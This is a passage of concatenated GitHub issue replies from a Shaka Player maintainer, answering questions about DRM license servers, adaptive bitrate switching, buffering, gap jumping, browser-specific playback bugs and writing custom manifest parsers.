license server.  It can be entered in the demo player in the text box, or using player.configure:\njs\nplayer.configure({\n  drm: {\n    servers: {\n      'com.widevine.alpha': '//widevine-proxy.appspot.com/proxy'\n    }\n  }\n});. I should note that you don't need that asset info to play your MPD.  That is only used by the demo app to disable assets that aren't supported (e.g. if your browser doesn't support WebM).  If you use your own app you only need the URL to the MPD file (and the license server since it's encrypted).  See the tutorials.. I just pushed a change that adds more docs to help.  Here are the answers to your questions:\n\nHow much is buffered before playback starts (minimum time or size buffered)?\n\nrebufferingGoal or MPD@minBufferTime, whichever is larger.\n\nWhat conditions trigger an adaptive up or down switch?\n\nWhen a segment is downloaded, SimpleAbrManager will decide if a better (higher bitrate) stream is  playable based on the current network bandwidth estimate.  It will wait some time between switches to avoid switching back and forth a lot.\nThis also changed recently to support HLS.  Before audio and video were selected separately.  Now, there are audio/video pairs called variants.  AbrManager will select the best variant it thinks can be played.\n\nHow far ahead of the current playhead are new qualities requested and appended?\n\nAs Joey said, we don't fetch other streams, only the one that is currently playing.  Once AbrManager decides we need to switch, we will start downloading that quality.  However, since we don't clear the buffer, the old content will play until the playhead gets to the new content.  This will be less than bufferingGoal seconds long.\n\nWhat configuration options can be used to modify ABR behavior?\n\nThere aren't many options to affect ABR directly.  In v2.1, you can pass a restrictions object to restrict decisions by AbrManager based on video size, bandwidth, etc..  You can also specifiy the defaultBandwidthEstimate to tell AbrManager what initial streams it should choose.\nThere are several streaming parameters that affect buffering.  bufferingGoal specifies how much we will buffer ahead of the playhead (and indirectly affects how much of the old bitrate we will play).  rebufferingGoal specifies how much to buffer if we enter a buffering state (or at startup).. @robwalch Does this answer all your questions?  Is there anything else we can do?. @raskri It is best to start a new issue, not to resurrect old threads.  Also questions may be better suited in the mailing list.\nBut to answer your question, there is no way to override the minBufferTime.  If the manifest specifies that it needs 10 seconds to play smoothly, then we will keep 10 seconds buffered.  Requiring 10 seconds of buffer doesn't mean that playback will be delayed by 10 seconds, only that we will wait until we have downloaded 10 seconds of content before starting.. There was a bug on Edge that we had a workaround for.  This workaround is now causing problems now that the original bug is fixed.  However, Edge's fix of the original problem introduces a different problem that we need to workaround.  We have filed a bug against Edge for this new case.\nBasically when we query EME for what the browser supports, Edge doesn't report everything that it supports so we think that some of the tracks are not supported when they in fact are.  So we need to update our workaround for this.. This appears to be bad content.  At time 2:04 there is a frame whose time overlaps another frame.  When you play the video and open chrome://media-internals it gives a warning of Generated splice of overlap duration 4000us into new buffer at 124993333us.  I also tried this in the Dash IF player and it failed to play also.\nThis fails to play in Chrome 55 (current stable).  This plays in Chrome 56 and produces a decoder error in Firefox.  You should file a bug with the packager that generated the content.. Chrome 56 is now in stable.. I think @joeyparrish's suggestion was that your server introduce gaps in the manifest timeline whenever the content doesn't exist.  So the manifest (and the content) might say there are segments from 0-10, 10-20, 30-40.  With the new design, Shaka Player will jump the 10s gap automatically (based on configs).  Or alternatively introduce a new Period with a @start time greater than the end of the previous Period so there is a gap between the Periods.. In that case, I'll close this issue.  You can follow gap jumping progress in #180 and #555.. The problem here is that Chrome doesn't seem to jump gaps after a seek.  It will usually jump gaps up to 0.5 seconds, even at the beginning of playback.  But if you seek to an unbuffered region that is right behind a buffered range, Chrome won't play.  You just happen to seek into the <0.1 second range that is needed to cause this.  You can see this by seeking to 440 and pausing, letting it buffer, then seeking to 430.05 (just before the buffered segment).\nI'll have a fix up soon.. That bug has been fixed on master.  Please try again with the latest code.. Sure, my email is in CONTRIBUTORS (I'm Jacob).. @salmoro I just pushed another fix that should fix the repro you sent me.  Please try again.. Sorry for the delay, just pushed a change that should fix your latest issue.  These fixes will appear in v2.1, some have been cherry-picked into v2.0.x.. Glad that it is fixed.  Thanks for sticking with this and providing easy reproductions.. I edited your comment to remove a huge log.  In the future, please use pastebin or similar service to avoid having a huge log in the issue page.\nFor most of the log you gave, the video is paused.  It also says we have meet our buffering goal.  This means that we have buffered enough and won't make any more requests.  What seems to be hapening is the video is paused and the playhead \"falls\" outside the timeshiftBufferDepth and the server gives 404s.\nIt is also possible that the video is buffering a lot, which causes the playhead to drift backwards.  This causes the same problem.  Is the playhead moving backward (probably slowly) as the video plays?  Are you pausing it as it plays? Is this any better with the cache enabled or on a faster internet connection?\n. I cannot reproduce any error.  I have played the stream fine on a number of devices and platforms.  I have also played successfully for 12 hours on Windows 10 with both Edge and Chrome.  What exactly do you do to reproduce?\nOne idea is that there is a gap in the live stream.  If the source has a problem or there is a lost packet, many live stream encoders will introduce a gap (or a missing segment).  We do not handle this case and this can cause playback to stall.. Closing due to inactivity.  If you still have the issue feel free to reopen.. Thanks for the report.  This was a problem with IE/Edge's reporting of buffered ranges.  They were slightly different when at the end of the stream, so we thought we needed more data.  It has been fixed on master.. Thanks for noticing this.  It has been fixed on master.. First, your license server doesn't have correct CORS headers so the demo player can't play it.  Second, the license server URL you gave is for the \"main\" page, not for the license endpoint.  When I do a GET on the URL it shows a default landing page.  The license URL given should be the URL where you send a POST message to get the license back.. Between the third and fourth video segments there is a gap.  The third segment ends at 9 seconds while the fourth segment starts at 9.08 seconds.  Firefox reports two buffered ranges for this and will not jump the gap automatically. Chrome doesn't report the gap and jumps it fine.\nYou should report this to the encoder that made the content.. We don't do manual gap jumping (see #180 and #472).  As suggested in a comment there, your app could do it for us by listening for a buffering event and seek over it.  You may also want to file a bug with Firefox.  This seems like a really small gap that it should be able to jump.\n@cpeterso You know anything about this?  I think Firefox would jump this normally, does it have to do with it being encrypted?. Ok, so I see the problem now.  Because we see the gap in the buffered ranges we enter a buffering state even though the browser will jump the gap.  Unfortunately we cannot increase the GAP_TOLERANCE because it will cause problems on Safari (and it won't jump the gap).\n@cpeterso Firefox will actually jump the gap, so there isn't a problem there.\nAlso, as discussed in that Firefox bug, the log and error is caused by an incorrect understanding in the spec.  It should now be fixed and playable in the latest Nightly.\n@mjaddani Error 3016 is a VIDEO_ERROR, which is usually a decoder error.  Usually there is nothing we can do about this error, it's the browser's fault (or bad content).  You may want to try playing a clear version of the same video.  But if you want me to take a look, my email can be found on my profile.. All we do is forward the data given to us by the browser, so we should be able to support any version of the PlayReady server.\nI can see the error in Edge.  This is a decoder error and there is nothing we can do.  I don't see anything obviously wrong with the content.  I suggest filing a bug and Microsoft may be able to help more.. We have decided to pursue gap jumping to support content like this.  You can track it in #555.\nClosing due to inactivity.. This is intended.  We will continue to download media segments until we meet a buffering goal, even if we are paused.  The buffering goal is an amount of time that we want to keep buffered ahead of the playhead so that you can play the video without buffering.  The default buffering goal is 10 seconds; so we will continue to download segments until we have 10 seconds of media buffered ahead of the current time.\nOn demand manifests are only downloaded once.  Live manifests will be downloaded repeatedly to update it, according to the minimumUpdatePeriod attribute in the manifest.  For example, one manifest may be downloaded every 10 seconds, whether we are paused or playing.. Closing due to inactivity.  If you have any more questions, feel free to reopen or create a new issue.. The problem is that phones do not have a mouse, but browsers simulate them.  The browser will still fire mouse events (e.g. mousemove) and it will still use the CSS :hover pseudo-class.  When you click the fullscreen button, the controls will get the :hover styles; however, the style doesn't get removed until you \"click\" somewhere else, even if you drag elsewhere.\nSo if we are getting touch events, we should override the :hover styles and hide the controls.. I was able to reproduce by modifying the demo app. Using the uncompiled version and making the demo reload inside DrmEngine caused the problem.  Thanks for the report and the solution.\nBasically both session.closed and session.close() refer to the same event but are different Promise objects.  So in this case they can be used interchangeably.. We already fetch the segment before the one we think we need.  We should be handling this case already.\nFirst I notice you are using a old version of Chrome (current is 56), you may want to update.  Also, is the content multi-Period or does it have a single Period?  Can you provide an example manifest?\nThere is an error event for when problems occur, but this is not an error.  You can also listen for a buffering event.  This is fired when the Player enters/exits a buffering state.  You can use this to seek forward if there are segments ahead of the playhead (using video.buffered).  There is no way to alter which segments are being downloaded.. Unfortunately your manifest is bad and we can't support it.  We don't want to invest a lot of time to support bad content.  Some of the segments are even three segments (up to 23 seconds) off.\nWe are currently working on gap jumping (see #180 and #555).  This may help your case by automatically seeking to the buffer start once we start buffering content.\nThe buffering event fires when we enter or leave a buffering state.  So what you could do is use setTimeout in the callback and if we stay in a buffering state too long, try to seek somewhere else.\nAnother option is to fork the repository and change StreamingEngine to fetch segments more in the past (changing position - 1 to position - 3).  This will increase the time it takes to seek because we stay in a buffering state longer; but it will fix your problem.. Unfortunately that will not work with rewind.  We don't actually buffer backwards while rewinding, all we do is repeatedly seek backwards.  Once we run out of buffer, it is treated as an unbuffered seek and we clear the buffer and start downloading segments forward again.\nThis means that once you rewind past the start of the buffer, the player will look for the \"current\" segment to download and will run into the same problem as normal seeking.  But rewinding within a buffered range should work fine.. This is a code given to us by the Chrome CDM, the values are not publicly documented.  This commonly happens when you forget to unwrap a license response or you enter the wrong license server URL and get back a webpage.  I would suggest opening up the DevTools network tab and looking at the license response value.. The first delay is a known limitation.  We only adapt after a segment is downloaded.  So if the network drops suddenly, we won't stop the segment from downloading, we will wait until it is finished (which may be 20 seconds).  Then we notice the bandwidth changed and adapt.\nThe second stall could be a bug, but I don't notice anything from the logs that would indicate why.  The URL you gave doesn't work.  The license server is giving me 403 errors (error while getting entitlement).. The problem is that the different streams are not aligned.  This means that the segment times of different streams do not have the same times.  So when we adapt and switch to a different stream, we will start appending segments from the new stream starting where we left off.  However, because they are not aligned, there will be a gap that the browser will not jump.  This can be seen by disabling ABR and manually switching tracks (this won't work in the demo app since it clears the buffer when explicitly changing tracks).\nWe are currently working on adding gap jumping to the Player (see #180 and #555).  However, you should contact your encoder about producing streams with aligned media segments.. Glad to help.  Feel free to reopen if you have any more questions.. It looks like the player is downloading segments that are close to the playhead initially.  If the media segments have a start time that is slightly more than what is in the manifest, then the buffer will start after the playhead and the video won't start to play.  This shouldn't happen.\nUnfortunately your URL doesn't work, the license server is giving me a 403 error (error while getting entitlement).. This only affects Chrome stable (56), this has been fixed in beta (57) and doesn't appear in Firefox.\nThe problem is that your license server sometimes takes a really long time to respond (20+ seconds).  Chrome doesn't seem to flush the media pipeline after updating EME if it takes longer than a few seconds.  But this has been fixed by Chrome.. What packager are you using to encrypt content but not include a pssh?  Most packagers will add a pssh box when they encrypt the content.  Are you sure the content is actually encrypted?\nYou can include a <cenc:pssh> element in the mpd even if it is in the segments.  The value given in the manifest will override the one given in the content.  The player will ignore any pssh boxes in the content if there are pssh boxes in the manifest.\nFirst I notice the cenc:default_KID attribute in the manifest doesn't match the key id specified in the pssh box.  This will cause the player to throw an error once the license request comes back since the license won't have that key id.  The attribute must either be missing or match the key id the content is encrypted with.\nI don't see anything wrong with your content.  It is possible this is a bug in IE.  But without a live URL to test with, we can't help.  Can you please provide a public URL so I can test (you can send it privately if you want, my email is in CONTRIBUTORS).  What you gave is your internal IP, which I can't access.. That URL works, but I am getting 404 errors for the segments.  Is the stream still running?  Please keep the stream running until this is fixed.. Now the stream works.  I am able to reproduce your error.  This seems to be a bug in Edge.\nIf you remove the audio stream from your manifest, I can play the video fine.  I am also able to reproduce with our test content by removing the pssh box from the audio init segments (video seems fine with it).\nI will create a self-contained repro and submit a bug to Edge.  In the meantime, you'll have to put the pssh in the init segment.  There doesn't seem to be any workaround we can do.. FYI bug filed: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/11016936/. I have occasionally seen Edge not send license requests, though not that often.  It is possible that it is storing the licenses on disk and when we request the license, it loads it from disk rather than asking the server.  But I'm not sure.\nI don't know how key rotation works in PlayReady.  In Widevine, it works as you describe: media segments contain pssh boxes that describe newer licenses.  As we play the media, the browser gives us those boxes and we request new licences.\nTry putting the first pssh box in the init segment and then newer pssh boxes in the media.  Also try putting a breakpoint in DrmEngine.prototype.onEncrypted_ to see if we are getting the new events correctly.  You'll need to use the uncompiled library, but the demo app does by default.\nAs for testing, Shaka Player doesn't require https.  The demo site redirects because Chrome requires it.  If you are running a local copy of the player on your own web server, it will not redirect.  Additionally, localhost is a secure domain, so Chrome will still allow playing protected content.. What appears to happen is Electron doesn't fully load the Widevine CDM until you access navigator.plugins.  Bitmovin seems to do this which is why it works.  If you enter navigator.plugins into the DevTools and reload Shaka Player it works fine.  This is a bug with Electron.. The getTracks() method will return all tracks (both variants and text tracks).  It is being replaced by getVariantTracks() and getTextTracks() which only return the respective tracks.  If there are no text tracks, all the tracks will be variant.  The warning is because we are removing the method, not because the structure changed.\nWe also changed what tracks are being returned.  Before we returned the individual audio and video tracks and you could choose them separately.  Now (in order to support HLS), you can only select by Variants, which is an audio/video pair.\nBut you are correct, we need to update that documentation.. 2.0.x will still return the old structure (with the old behavior) and won't have the new methods or the warning.\n2.1.x (and current master) will return the new structure, have all three methods with a warning.\n2.2 will remove getTracks().. The HLS manifest specifies a set of possible variants that the player can choose from.  It does not allow switching between arbitrary streams.  So when HLS specifies two variants with different audio and video streams, you can't switch between all possible combinations, only between the variants that were specified.. Thanks for noticing this.  It has to do with the recent change to only allow using the demo over https.  That asset uses an embedded URL for the license server that uses http.  This causes problems because the browser rejects mixed content requests.. I just pushed option 2 so the asset is playable now while we wait for YouTube to update their asset.. Buffering and seeking logic is the same for live and on-demand content.  So if this were on-demand, we would start playback at 0s.  Initially, there is no content in the <video> element, so we cannot play anything.  We will wait in a buffering state until we have enough content buffered, then start playback.\nWhere we start playback is a little different for live vs on-demand.  On-demand content starts at 0s, unless you specify a start time.  Live starts close to the \"live-edge\".  We look at the manifest and determine where \"now\" is in the stream and start playback there.  This may be in the middle of a segment, but has nothing to do with how long it took to download the segment.  We don't adjust start time based on how long it took to download: we pick a time to start at, buffer starting from there, and start playback once we have downloaded enough.\nIf the segments are 2s and it takes longer than 2s to download, we should adapt to a lower bitrate (if there is one).  It should always take less time to download than to play; otherwise playback will stutter because we will be buffering a lot.. We have no way of knowing how fast the internet connection is initially, so we don't know how long a download will take.  So we just start playback at \"now\" and we will be close to the live edge.  If you want to be right at the live edge, you can just seek after we have buffered up to it.  We could add an option to automatically seek to the live edge once we have buffered, but it should be easy for your app to do this: once we leave the buffering state (you should get a buffering event) then seek to the end of the seek range.\nThe minBufferTime specifies the minimum amount of time that needs to be buffered to have smooth playback.  This means, according to DASH, we shouldn't start playback until we have at least that amount buffered.  With a segment taking 6s to download, the minBufferTime would need to be at least 6s, otherwise we won't get smooth playback.  If you start at 7s in a segment: we would start playback, play for 3s, then enter another buffering state because we haven't finished downloading the next segment yet.\nFor live streams, you should really have a shorter segment duration.  This allows segments to be downloaded faster and can help with startup time.. Ok, so you want a configuration option to start at a segment boundary.  We can do that.. It is possible for a manifest to not be accurate, meaning that the times in the manifest are not the same as the times in the media segments. To account for this, we will actually start downloading segments before the time we want.  So even with a 6s minBufferTime and 10s segments, we will download two segments, up to three, to buffer enough.\nFor example: if the times in the manifest are behind the times in the media and we start playing at the beginning of the segment. We would download that exact segment which would start after where the playhead is and be left with a gap.  This is why we unconditionally download the segment before the time we want.\nAlso note that audio and video streams may not be aligned.  So a \"segment boundary\" may not be exactly at the start of the segment.. This was a problem with the demo receiver app that runs on the Chromecast.  I did a push to the nightly site so it should be working there.  We will cherry-pick this to the v2.0.x branch and it will appear in the next bugfix release.\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/. What do you mean by metadata?  You seem to be talking about text streams (e.g. subtitles).  Do you have an example DASH manifest showing what this looks like?  We don't generate DASH manifests, we only play them.  If you are talking about generating content, you may want to look at google/shaka-packager.\nMp4TtmlParser and TtmlParser parse text streams.  They parse the TTML streams and produce text cues that can be used to display subtitles on the video.\nOne option would be to add this data to an <EventStream> element (see #462).  When the playhead enters a region specified by this element, an event is raised with the XML element so you can get the data from it.. So it looks like VTT allows for embedded metadata.  Some apps (like JW player) seems to interpret the cues as JSON and pass it to the app.  Is this how your setup works?\nPlease provide us with (at least a copy of) the DASH manifest that Wowza is generating.  This will allow us to see how the metadata is being sent and if we can handle this case.  You can send it to me privately if you want (my email is in CONTRIBUTORS and on my profile).. @neilRGS Any updates on this?\nI would think this would be fairly easy to get.  Don't you pass the manifest URL to JW Player?  You could also open up DevTools and look at the network tab for the manifest (probably has a .mpd extension).. This was implemented in 3db0f33.  This isn't intended to be used as a plugin and the API is not guaranteed to be stable.. This is a new API and our compiler doesn't know about the types involved.  You will need to add an additional file to the externs folder.  Simply copy one of them and modify it to describe the new APIs (you don't need to include everything, just what you use).\nYou can also run build/all.py to check that it works locally.. Thanks for the PR and thanks for introducing this to us.  This will be helpful if we decide to add more UI elements to our demo app.. It is already live on the nightly site: https://nightly-dot-shaka-player-demo.appspot.com/demo/.  It will appear in the normal demo once we release v2.1.. A PR for this would be welcome.  The idea for the linked PR looks good, just make sure that all the tests still pass.. When there is a seek, there are a number of cases that we may be in:  Live/on-demand, buffered/unbuffered, in-range/out-of-range, etc.. That TODO is about explaining how the code handles all those cases in the way that we want.  It is unrelated to your actual question.\nIn live streams, segments may not be available forever.  Usually they are only kept around for a set amount of time.  In DASH, this is specified using the timeShiftBufferDepth attribute.  This specifies an \"availability window\" for how long a segment is available on the server.  If the manifest only says segments will be available for 1 hour, then you can only seek backwards for 1 hour since older segments may have been deleted off the server.\nYou may want to look at shaka.media.PresentationTimeline, which defines which segments are available (Playhead enforces it).  Specifically, getSegmentAvailabilityStart and getSegmentAvailabilityDuration.. Ok.  We could probably drop the 1, maybe the 2.  I'll need to discuss with the rest of the team.  Unfortunately the person that wrote it is no longer here and I'm a little fuzzy on the details of those.  This also needs to be adjusted for our (relatively) new in-progress recording support.\nThe reason we add rebufferingGoal is because we are unbuffered and we assume the window is moving.  So when we seek to that position, we will need to pause and wait for segments to be downloaded.  This can cause us to \"fall\" outside the availability window while we buffer.  To be safe, we add rebufferingGoal, which should be the amount of content that needs to be buffered to have seamless playback; therefore it should be a good approximation of the amount of time it will take to buffer enough.. The expiration is calculated based on the end time of the segment.  So if liveEdge - TSBD is in the middle of a segment, that segment is still available.  It is only after liveEdge - TSBD passes the end time of the segment is that segment no longer available.\nThe problem on the client is that we have no way of knowing how long a segment remains available on the server, so it is the client's responsibility to enforce the availability window.  Now, we could allow playing content that we have already downloaded (e.g. the case where we \"fall\" outside the availability window while buffering); however, this can cause confusion for the users (especially with the seekable range).  This also breaks the intent of the TSBD, which is that the content is no longer available after that time, so we shouldn't play it.\nWe allow playing content that is near the earliest availability time, but so long as we are buffered so we don't fall outside the range while buffering.. You're right.  The problem is we adjust the availability start to 0.  After we adjust, we add rebufferingGoal.  What we should be doing is calculating the availability start, subtract rebufferingGoal, and then adjust to 0.  This will allow 0 to be considered \"safe\" so long as TSBD is far enough away.. A variant track represents a pair of both audio and video.  So when you switch to a different variant, you are changing both audio and video streams, so we clear both buffers.  In v2.1 (latest master), you can no longer select individual audio and video tracks, you can only select an audio/video pair.. In HLS, we are only given audio/video pairs and those are what we can switch between.  So if you wanted to switch to a different audio stream, it might not be compatible with the current video stream.  This would mean that we would either have to throw an error for the change, ignore the change, or also switch video.  These are not good user experiences, so we only allow changing by variants directly.\nIf all you want to do is change the audio language, there is a new API to do that.  player.selectAudioLanguage will change the selected audio language and switch tracks for you.  This will change the current audio track, trying to keep the video track the same.. Would it be possible to get a live (playable) version of the manifest so we can test that our fix actually works?  You can send it privately if you want (my email is in CONTRIBUTORS and on my profile).. It would be really helpful if you could give us something to test ourselves.  But in the meantime, can you try the following patch:\n```diff\ndiff --git a/lib/dash/mpd_utils.js b/lib/dash/mpd_utils.js\nindex 7ee7dee..993ef05 100644\n--- a/lib/dash/mpd_utils.js\n+++ b/lib/dash/mpd_utils.js\n@@ -320,12 +320,8 @@ shaka.dash.MpdUtils.fitSegmentReferences = function(\n             firstReference.startByte, firstReference.endByte);\n   }\n\nif (dynamic)\nif (periodDuration == null || periodDuration == Infinity)\n     return;\ngoog.asserts.assert(periodDuration != null,\n'Period duration must be known for static content!');\ngoog.asserts.assert(periodDuration != Infinity,\n'Period duration must be finite for static content!');\n\nvar lastReference = references[references.length - 1];\n```. I just pushed a change that might help your problem.  I think the problem is that the last segment of the Period before it isn't being adjusted to the end of the next Period.  This introduces a gap that makes us try to fetch the wrong Period.\n@albertcsm Please try again from master.. The manifest you linked is static, not live.  It provides 5.6 seconds of content and will never update.  To make this  be updateable, it needs a minimumUpdatePeriod attribute.\nThe reason there is a delay is related to the suggestedPresentationDelay attribute.  This specifies the amount of delay between when the content is being generated and the user is playing it.  When not provided, we give a default of 10 seconds.  You could reduce this by specifying it in your manifest, but see below.\nThere is probably going to be at least some delay between when you are recording the live stream and the user sees it.  With 2s segments, the new segments will only be available 2s after they are recorded.  Then the app needs to download them and add them to the <video> element and only then can the content be played.  Also note that there needs  to be content in the buffer ahead of the playhead in order to play it.  So even with 2s segments, it will be delayed by a minimum of 1 more segment (4s).\nThe manifest you linked to also uses <SegmentTimeline>, meaning that we need to download the manifest and parse it to determine where to get new segments.  This leads to more delay since we need to wait until the next manifet update, download it, parse it, and add the new segments to our internal structure.  It would help if you used <SegmentTemplate> with duration attribute.. With an unmodified Player, by setting the suggestedPresentationDelay in the manifest, I am able to get latency down to slightly more than the 2s segment duration.  It will usually enter a buffering state quickly and will fall backwards to about 5s.  If you are on the demo page, you can click the current time in the controls to seek to the live edge.\nHow are you determining the latency?. You can cancel a store() by calling storage.destroy().  This will cancel the store and delete any partially-downloaded content.  destroy() also returns a Promise that will resolve once the the abort is done and the object is destroyed.\nUnfortunately, you cannot use this instance after calling destroy().  You will need to create a new instance to do another store.. There is a bug in the older versions of Edge (pre-EdgeHTML 14) with EME.  We had a workaround, but we needed to remove it to support newer versions.  If you update Edge, it will work (which will require installing the anniversary update).  Alternatively, you can try using a custom Shaka build with the commit below reverted.\nEdge bug: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/7223299/\nCommit that changed it: 371687a9. The timestamp field is the time the event was created, so has no use here.  presentationTimeDelta represents the time (in units of timescale) that the event starts.  This is relative to the segment that it is embedded in.  eventDuration represents the duration (in units of timescale) that the event lasts.\nSo the presentation times would be: \njs\nstartTime = segmentStartTime + (presentationTimeDelta / timescale);\nendTime = startTime + (eventDuration / timescale);\nWe should update the docs to be explicit about these fields.  Currently there is no way to get the start time of the segment.  The reason is that the parsing of the emsg box is done as a network response filter, which doesn't have access to the segment info it came from.  We should consider providing this info somehow (e.g. parsing the sidx).\nDo you have a public manifest that has emsg boxes?. Shaka Player doesn't do any UI work.  It is up to the app to show things like volume-bar.  You can just add this to your receiver app html page.\nOur demo page includes an example receiver app that shows an \"introduction overlay\" and the progress-bar.  It doesn't show the volume-bar, but that could be easily added.. The top dialog is from the Chrome extension.  The interface for that changed in the last few months.  We have no control over that.  Volume is primarily controlled on the cast side (e.g. on the TV), but Shaka Player also proxies volume over the app.  So if you adjust the volume bar in our demo app (on the sender side) it will change the Chromecast volume.\nThe overlay in the bottom screenshot is likely created by that app.  They probably did this with a static image or with some CSS.  One way to detect the first time someone visits your app is to use local storage.. That tutorial is from a really old version of the player.  The latest is v2.0.5 which has an updated api.  You can follow the latest tutorial:\nhttps://shaka-player-demo.appspot.com/docs/api/tutorial-basic-usage.html. There are more tutorials on the right side of the page.\nhttps://shaka-player-demo.appspot.com/docs/api/tutorial-drm-config.html. Great, if you have any other questions, be sure to ask.. We don't cancel network requests that are in progress.  So when you throttle the network down, we will request the current quality and it will take a long time to download.  Once that segment is done, we'll detect the slower network and choose a lower bandwidth stream.  Unfortunately, since we don't have a way to cancel, we have to wait until we get the response back to adapt.. Your link doesn't work.  To confirm, your issue is that when you throttle there is a slight delay before we choose the lower stream, right?. @yairans That link doesn't work either.  For both links I am getting 404 errors from the manifest.\nI am confused by your description of the problem.  Can you please describe exactly what the Charles program is doing, what the browser appears to do, and what the player does wrong.  Thanks.. I think there are two kinds of stalling that can happen here:\nFirst, if it is stalling before switching tracks.  This can happen because it takes us a few segments to determine the bandwidth has changed.  It will stall after every segment while it downloads high-bandwidth tracks until it determines the bandwidth changed.\nSecond, if it is stalling after switching tracks.  This can happen if the bandwidth in the manifest doesn't match the bandwidth required to download the stream or if our estimate is slightly wrong.  What I think is happening is that your buffer times are not ideal.\nYour minBufferTime is the same as the segment size.  This means that we will only download one segment ahead of the playhead.  Also, if the estimated bandwidth is the same as the stream's bandwidth, it will take as long to download the segment as to play it.  Meaning we will run out of buffer right before we download the segment.\nI would suggest that you decrease the segment sizes.  This will allow us to detect the bandwidth changes sooner and will increase the size of the buffer (in number of segments).  This will also make it easier to play at the live edge.  Alternatively you could increase the minBufferTime in the manifest or the bufferingGoal configuration in the Player.. If you are changing the bufferingGoal in the demo, you need to change it after you start playback.  Otherwise the demo will reset the value when you click Load.\nWhat's probably happening is it is taking slightly longer (or exactly the same time) to download a segment than to play it.  So we hit the end of the buffer before we finish downloading the next segment.\nUnfortunately, it is already playing the lowest bandwidth stream, so there is nothing we can do.  The bandwidth fields in the manifest are probably slightly wrong, but since there is no lower quality stream, increasing the fields wouldn't do anything.. Gaps should usually be handled on the packager (or transcoder) side.  They are the ones producing the content and they should be the ones to produce valid, playable, content.  However, we are currently working on adding gap jumping to the player because we see a lot of content with gaps in it (especially with live streams).  See #180 and #555.\nHaving gaps is probably valid in terms of the spec, but it makes playing it in the browser difficult.  Because we use MSE, we just give data to the browser and it then it creates \"buffered ranges\" based on what data it has.  If there are gaps, the browser doesn't know whether that content will be added later.  When the browser plays to the gap, it will stop playback, waiting for the content.\nBut, since we have the manifest, we know that the content will never be added.  So we could see the gap and jump it automatically.  And that is what we are working on.. I should also note that small gaps, the browser will jump automatically.  What is small depends on the browser.  Firefox will jump a gap of 200ms while Safari will only jump 22ms.  Currently, we won't buffer past a gap of 20ms because that is the minimum amount that will be jumped.  This provides a consistent cross-browser experience and makes bad content more obvious.. This may be a bug in Chrome.  What I think may be happening is that Chrome is not using the times in the container (MP4) to determine the frame times.\nWhat happens is we append the data to the media source.  The times for each frame is encoded both in the container and in the elementary stream.  However, in the stream, it only encodes the duration of the frame, not the absolute time.  So as Chrome is decoding frames, it is using the duration to determine when the next frame is and this leads to the audio lagging behind since the duration doesn't account for the gaps.\nCan you generate an on-demand version of the content? If you generate an on-demand stream, the packager will generate a single MP4 file that also is playable by itself.  This will allow you to play the file by itself in Chrome to see if it get desync there too.. @hariszukanovic Any update on this?  Were you able to generate the on-demand content?. Can you please provide a manifest that reproduces this error.  You can send it to be privately if you want (my email is in CONTRIBUTORS or on my profile).  Without a way to reproduce it, it will be very hard to track down why this happened.. We use MSE to play media.  We create a buffer for audio and video data and append data as we get it.  The browser pulls data from the buffers to play it in the <video> element.  If we switch from video+audio to just video, the browser will pause at the transition waiting for the content to buffer, but it doesn't know that the audio is never coming.\nWhat we could do is reset MSE once we get to the transition, but then the transition won't be smooth since we need to delete everything and re-download it when the playhead gets there.  It would also be a lot more complicated to implement.  To make things simpler, we don't allow changing from video+audio to video-only.. I don't understand your question, can you rephrase?  Are you asking if we support things other than audio/video/text, or are you asking about what the purpose of that code is?. I should note that although we won't support changing video+audio to video-only, we should support changing between text and no text.  I was told that we don't support changing between Periods that do and do not have text streams.  That is something we should fix.. First, it would really help if you could post the app so we could look at it.  Another thing would be to get a stack trace for the error.  That error can happen in a few places and knowing where it happened would really help.  Lastly, if you could post the result of JSON.stringify(yourManifest), we could see if there is anything wrong with your version of the manifest.\nIt might be easier for you to not modify the DashParser and instead just look at the manifest object definitions.  There is a lot of work in the DashParser that wouldn't be needed in your parser.  The manifest is defined in externs/shaka/manifest.js.  Also what might help is looking at the OfflineManifestParser; it is much simpler to read and doesn't do much work besides converting a stored JSON object to a manifest object.. The error is from the emsg box reader.  Since WebM never has emsg boxes, you should not be adding the emsg response filter for this content.\nAll the code in the shaka.dash namespace is internal to the DashParser and isn't intended for general use.  Using them will likely result in problems.  I am working on a tutorial to help with writing manifest plugins, and I will repeat some of it here.\nThere are three callback functions you need to define for each stream.  These can be any function you want so long as the have the following behavior:\ncreateSegmentIndex: This is called exactly once before the other two.  It should return a Promise that resolves once the index is created.  This is used to reduce latency by delaying fetching the index from the server when it needs to.\nfindSegmentPosition: This is given the time (in seconds) relative to the Period start and should return the (number) index of the segment that contains that time, or null if not found.  We will increment this number as we stream, we will not call this for every segment.\ngetSegmentReference: This is given an index and should return the shaka.media.SegmentReference for that index (doesn't have to be the same object each call), or null if not found.\nTo help you define these, I suggest using the shaka.media.SegmentIndex class.  This accepts an array of shaka.media.SegmentReference objects and defines the find and get methods for you.  For example:\n```js\nfunction uri(str) {\n  return function() { return [str]; };\n}\nvar refs = [\n  new shaka.media.SegmentReference(0, 0, 10, uri('https://example.com/seg1'), 0, null),\n  new shaka.media.SegmentReference(1, 10, 20, uri('https://example.com/seg2'), 0, null),\n  new shaka.media.SegmentReference(2, 20, 30, uri('https://example.com/seg3'), 0, null)\n];\nvar index = new shaka.media.SegmentIndex(refs);\nvar stream = {\n  createSegmentIndex: function() { return Promise.resolve(); },\n  findSegmentPosition: index.find.bind(index),\n  getSegmentReference: index.get.bind(index),\n  ...\n};\n```. @fernandoneira  We just pushed a new tutorial (in d1bc3fd) for making manifest parsers.  If you have any further questions or comments, feel free to ask.\nhttps://nightly-dot-shaka-player-demo.appspot.com/docs/api/tutorial-manifest-parser.html. This has been fixed in the master branch, so it will appear in v2.1.  I have also pushed a change to the v2.0.x branch.  You can pull that branch and build yourself if you want to use v2.0.x. It will appear in the next bugfix release (if we do one).. I'm curious about why it would depend on the Player instance.  Can you describe your use case more?  Usually a scheme plugin would be independent to the Player.  For example, network requests don't depend on the Player.  Does this have to do with bandwidth estimation?\nRequest/response filters are applied per-Player (actually per-NetworkingEngine).  Could you do this using a filter?. This seems like a bug on Wowza.  Changing the availabilityStartTime is not valid.  availabilityStartTime must remain the same value throughout the stream so we can determine when the segments occur.. The link doesn't work for me (still getting 403 errors).  A 403 error is Forbidden.  This means that I don't have permission to access to the asset.  My guess would be that either you have a cookie that allows you to access it or that server does IP filtering.\nTry accessing the URL from an Incognito window to see if you have cookies.  Also try accessing it from another location to see 